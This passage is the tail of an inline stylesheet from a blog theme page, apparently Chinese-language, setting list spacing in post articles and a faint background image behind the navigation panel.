    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
